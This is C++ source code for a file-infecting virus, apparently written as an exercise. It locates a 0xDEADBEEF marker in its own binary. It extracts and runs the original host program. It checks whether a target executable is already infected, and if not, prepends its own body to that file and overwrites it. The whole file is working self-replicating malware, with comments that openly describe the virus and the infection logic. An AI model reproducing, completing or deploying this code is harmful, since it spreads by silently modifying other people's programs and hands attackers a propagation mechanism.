#include <iostream>
using namespace std;
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#include <cstdio>
#include <sstream>
#include <fstream>
#include <sys/mman.h>

int main(int argc, char * * argv) {
    //cout<<"Running main"<<endl;
    int fd_r;
    char *buf;
    struct stat stat;
    fd_r = open(argv[0], O_RDONLY);
    fstat(fd_r, &stat);
    int length = stat.st_size;

    //cout<<"Length of the virus file: "<<length<<endl;
//Finding the offset
    std::ifstream infile(argv[0], std::ifstream::binary);
    int offset = 0;
    char test;
    int delim[4]; delim[0] = '\xde', delim[1] = '\xad',delim[2] = '\xbe',delim[3] = '\xef';// delimiter is '$@'
    bool found_delim = false;
    while(infile) {
        infile.read(&test, 1);;
        if(test == delim[0]) {
            infile.read(&test, 1);;
            if(test == delim[1]) {
                infile.read(&test, 1);;
                if(test == delim[2]){
                    infile.read(&test, 1);;
                    if(test == delim[3]){
                        found_delim = true;
                        break;
                    }
                    ++offset;
                }
                ++offset;
            }
            ++offset;
        }
        ++offset;
    }
    //cout<<"Offset location: "<<offset<<endl;
    close(fd_r);
    int fdr2;
    int bufsize = 2;
    fdr2 = open(argv[0], O_RDONLY);
    char *tmp_pointer = "dummy_file3";
    int fdw2;
    fdw2 = open(tmp_pointer, O_CREAT | O_TRUNC | O_RDWR, 00700);

    int flag = 0;
    buf = (char *)malloc(bufsize* sizeof(char));
    //check this length if the program misbehaves
    //length++;
    while (flag<length) {
        if (flag < offset+4) {
            read(fdr2, buf, 1);
            flag = flag + 1;
        }
        else
        {
            *buf = 0;
            read(fdr2, buf, 1);
            write(fdw2, buf, 1);
            flag = flag + 1;
        }
    }
    //everthing after offset is copied to new file
    fstat(fdw2, &stat);
    int length4 = stat.st_size;
    //cout<<"Temporary file to execute length: "<<length4<<endl;
    close(fdw2);
    close(fdr2);
//checking if the second file is infected or not
    string file2name = argv[1];
    //cout<<"Second item file name: "<<file2name<<endl;
    std::ifstream infile2(file2name, std::ifstream::binary);
    int offset2 = 0;
    char test2;
    int delim2[4];
    delim2[0] = '\xde', delim2[1] = '\xad',delim2[2] = '\xbe',delim2[3] = '\xef';
    bool found_delim2 = false;
    while(infile2) {
        infile2.read(&test2, 1);;
        if(test2 == delim2[0]) {
            infile2.read(&test2, 1);;
            if(test2 == delim2[1]) {
                infile2.read(&test2, 1);;
                if(test2 == delim2[2]){
                    infile2.read(&test2, 1);;
                    if(test2 == delim2[3]){
                        found_delim2 = true;
                        break;
                    }
                    ++offset2;
                }
                ++offset2;
            }
            ++offset2;
        }
        ++offset2;
    }
    //cout<<"Offset location of second file: "<<offset2<<endl;
    int secondfile;
    secondfile = open(argv[1], O_RDONLY);
    fstat(secondfile, &stat);
    int length_secondfile = stat.st_size;
    //cout<<"Length of the second file: "<<length_secondfile<<endl;
    close(secondfile);
    if (length_secondfile<offset2) {

        int fdr3;
        fdr3 = open(argv[0], O_RDONLY);


        char *secondfilepointer = "secondfile";
        int fdw3;
        fdw3 = open(secondfilepointer, O_CREAT | O_TRUNC | O_RDWR, 00700);

        int flag2 = 0;
        char *buf2;
        int bufsize2 = 1;
        buf2 = (char *) malloc(bufsize2 * sizeof(char));

        //If program misbehaves check this offset value
        int targetoffset = offset + 4;

        while (flag2 < offset) {
            *buf2 = 0;
            read(fdr3, buf2, 1);
            write(fdw3, buf2, 1);
            flag2 = flag2 + 1;
        }
        write(fdw3, buf2, 1);
        flag2 = flag2 + 1;
        while (flag2 < targetoffset+1) {
            *buf2 = 0;
            read(fdr3, buf2, 1);
            write(fdw3, buf2, 1);
            flag2 = flag2 + 1;
        }
        fstat(fdw3, &stat);
        int length5 = stat.st_size;
        //cout << "Length of just virus  plus offset: " << length5 << endl;

        int fdr4;
        fdr4 = open(argv[1], O_RDONLY);
        fstat(fdr4, &stat);
        int length6 = stat.st_size;

        char *buf3;
        int bufsize3 = 1;
        buf3 = (char *) malloc(bufsize3 * sizeof(char));

        //cout << "Length of just new host: " << length6 << endl;
        int flagnew = 0;
        while (flagnew < length6) {
            *buf3 = 0;
            read(fdr4, buf3, 1);
            write(fdw3, buf3, 1);
            flagnew = flagnew + 1;
        }

        fstat(fdw3, &stat);
        int length7 = stat.st_size;
        //cout << "Length of just virus, offset, new host: " << length7 << endl;


        close(fdw3);
        close(fdr3);
        close(fdr4);
        rename("secondfile", argv[1]);
        char *argm[] = {NULL};
        system("chmod ugo+x dummy_file3");
        pid_t pid = fork();
        if (pid == 0) {
            execvp("./dummy_file3", argm);
        } else {
            int status;
            waitpid(pid, &status, 0);

        }


        //cout<<pid<<endl;
//    string secondinname = argv[1];
//


        remove("dummy_file3");
        return 0;

    }
    else{
        remove("dummy_file3");
        //cout<<"File is already infected"<<endl;
    }
    return 0;

}



